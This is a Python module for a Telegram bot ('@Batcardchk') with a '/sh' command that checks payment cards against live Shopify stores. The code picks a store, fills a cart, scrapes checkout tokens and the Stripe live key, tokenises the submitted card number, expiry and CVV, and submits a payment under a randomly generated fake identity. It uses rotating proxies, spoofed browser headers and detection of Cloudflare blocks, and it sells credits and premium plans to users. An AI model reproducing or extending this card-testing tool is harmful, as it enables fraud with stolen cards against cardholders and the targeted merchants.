import aiohttp
import asyncio
import time
import re
import json
import random
import string
from html import escape
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 SHOPIFY DIRECT SITES CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SITES = [
    ("https://1898-products.myshopify.com", "2.98"),
    ("https://anotherseasonwaco.myshopify.com", "2.00")
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL DATA & PROXY HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "Christopher", "Ryan", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores"]
US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Tampa", "FL", "33601"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Los Angeles", "CA", "90001"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road", "0123 Birch Court", "4567 Willow Way"]

def load_proxies():
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0}
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL": return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"; ud["credits"] = ud.get("pre_premium_credits", 150); ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID: return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"): not_joined.append((name, link))
        except Exception: pass
    return not_joined

def gen_fake_data():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    street, (city, state, zip_code) = random.choice(US_STREETS), random.choice(US_CITIES)
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    email = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@gmail.com"
    return fn, ln, street, city, state, zip_code, phone, email

def get_full_chrome_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# REAL SHOPIFY API AUTOMATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_shopify_real(session, site_url, price, card_data, proxy):
    base_url = site_url.rstrip('/')
    headers = get_full_chrome_headers()

    # 1. Fetch Product
    async with session.get(f"{base_url}/products.json?limit=1", headers=headers, proxy=proxy, timeout=15) as resp:
        if resp.status != 200: return "DECLINED", f"SITE_ERROR_{resp.status}"
        data = await resp.json(content_type=None)
        if not data.get("products"): return "DECLINED", "NO_PRODUCTS_FOUND"
        variant_id = data["products"][0]["variants"][0]["id"]

    # 2. Add to Cart
    cart_payload = {"items": [{"id": variant_id, "quantity": 1}]}
    async with session.post(f"{base_url}/cart/add.js", headers={**headers, 'Content-Type': 'application/json'}, json=cart_payload, proxy=proxy, timeout=15) as resp:
        if resp.status != 200: return "DECLINED", "CART_ADD_FAILED"

    # Wait 1 second to mimic human behavior
    await asyncio.sleep(1)

    # 3. Scrape Checkout Page for Tokens (Follows redirects to checkout.shopify.com)
    async with session.get(f"{base_url}/checkout", headers=headers, proxy=proxy, timeout=25, allow_redirects=True) as resp:
        html = await resp.text()
        
        # Check for Cloudflare Anti-Bot protection
        if "Just a moment" in html or "Checking your browser" in html or "cf-challenge" in html:
            return "DECLINED", "CLOUDFLARE_BLOCK"
            
        # Search for Stripe Publishable Key (pk_live_...)
        match_pk = re.search(r'pk_live_[A-Za-z0-9]+', html)
        # Search for Checkout Token
        match_token = re.search(r'checkout_token["\']?\s*[:=]\s*["\']?([a-f0-9]+)', html)
        # Search for Authenticity Token
        match_auth = re.search(r'name=["\']authenticity_token["\']\s*value=["\']([^"\']+)', html)
        
        # If we can't find the tokens, the checkout is locked or JS protected
        if not match_pk or not match_token:
            return "DECLINED", "CHECKOUT_JS_BLOCKED"
            
        stripe_pk = match_pk.group(0)
        checkout_token = match_token.group(1)
        auth_token = match_auth.group(1) if match_auth else ""

    # 4. Tokenize Card via Stripe
    stripe_data = {
        'type': 'card', 'card[number]': card_data['card_number'], 'card[cvc]': card_data['cvv'],
        'card[exp_year]': card_data['year'], 'card[exp_month]': card_data['month'],
        'key': stripe_pk
    }
    async with session.post('https://api.stripe.com/v1/payment_methods', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=stripe_data, proxy=proxy, timeout=15) as resp:
        rj = await resp.json(content_type=None)
        pm_id = rj.get("id")
        if not pm_id:
            err = rj.get("error", {})
            code = err.get("decline_code", err.get("code", "ERROR"))
            msg = err.get("message", "Unknown")
            return "DECLINED", f"STRIPE_ERROR | {code.upper()} - {msg}"

    # 5. Submit Payment to Shopify
    fn, ln, street, city, state, zip_code, phone, email = gen_fake_data()
    pay_url = f"https://checkout.shopify.com/payments"
    pay_payload = {
        "authenticity_token": auth_token,
        "checkout_id": checkout_token,
        "payment_method_id": pm_id,
        "amount": price,
        "billing_address": {
            "first_name": fn, "last_name": ln, "address1": street, "city": city, "province_code": state, "zip": zip_code, "country_code": "US", "phone": phone
        }
    }
    
    async with session.post(pay_url, headers={**headers, 'Content-Type': 'application/json'}, json=pay_payload, proxy=proxy, timeout=20) as resp:
        try: rj = await resp.json(content_type=None)
        except: return "DECLINED", "PAYMENT_SUBMIT_FAILED"
                
    status_str = json.dumps(rj).lower()
    if "card_declined" in status_str or "declined" in status_str:
        ft = rj.get("failure_type", rj.get("error", "CARD_DECLINED"))
        return "DECLINED", ft.upper()
    elif "success" in status_str or rj.get("id"):
        return "CHARGED", "PAYMENT_SUCCESS"
    else:
        return "DECLINED", "UNKNOWN_RESPONSE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text("⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML")
        return

    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text("<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\nJoin our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
        return

    # ── Parse card (FIXED EXTRACTION) ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        replied_text = replied_msg.text or replied_msg.caption or ""
        match = re.search(r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})', replied_text)
        if match:
            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
        else:
            match = re.search(r'\b(\d{13,19})\b', replied_text)
            if match: card_str = match.group(1)

    if not card_str:
        await update.message.reply_text("⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>", parse_mode="HTML")
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc_num, mm, yy, cvv = parts
    if len(yy) == 4: yy = yy[-2:]
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    ud = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text("<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\nYou have no credits left.\nRedeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━", parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")], [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)]]))
            return
        ud["credits"] -= 1

    msg = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>", parse_mode="HTML")
    start_time = time.time()
    bin_num = card_str[:6]

    try:
        timeout = aiohttp.ClientTimeout(total=60)
        proxy = random.choice(PROXIES) if PROXIES else None
        
        # Pick a random site and price from the list
        site_url, price = random.choice(SITES)
        site_domain = urlparse(site_url).netloc
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            status, raw_response = await check_shopify_real(session, site_url, price, card_data, proxy)
            
        status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # Fetch BIN Info concurrently
        bin_data = await get_bin_info(bin_num)
        bin_txt = "N/A"
        country = "N/A"
        flag = ""
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            t = str(bin_data.get("type", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"
            
        time_taken = f"{time.time() - start_time:.2f}"
        raw_plan = ud.get('plan', 'TRIAL').upper()
        plan_ui = get_styled_plan(raw_plan)
        username = user.first_name or "User"

        safe_response = escape(str(raw_response))
        safe_proxy = escape(proxy if proxy else "None")
        
        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{card_str}</code>\n"
            f"Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒 🟢\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🌐 𝗦𝗜𝗧𝗘 ➺ {site_domain}\n"
            f"💰 𝗣𝗥𝗜𝗖𝗘 ➺ ${price}\n"
            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ {safe_proxy}\n"
            f"📜 𝗥𝗘𝗦𝗣 ➺ {safe_response}\n"
            f"⏱️ 𝗧𝗜𝗠𝗘 ➺ {time_taken}s\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🏦 𝗕𝗜𝗡 ➺ {bin_txt}\n"
            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🦇 𝗨𝘀𝗲𝗿 ➺ {username} ({plan_ui})\n"
            f"📢 @Batcardchk"
        )
        
        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb_result(premium), disable_web_page_preview=True)
        
    except asyncio.TimeoutError: 
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text("<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\nAPI took too long. Try again.\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")
    except Exception as e: 
        if not premium: ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n<code>{escape(str(e)[:120])}</code>\n━━━━━━━━━━━━━━━━━", parse_mode="HTML")

def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
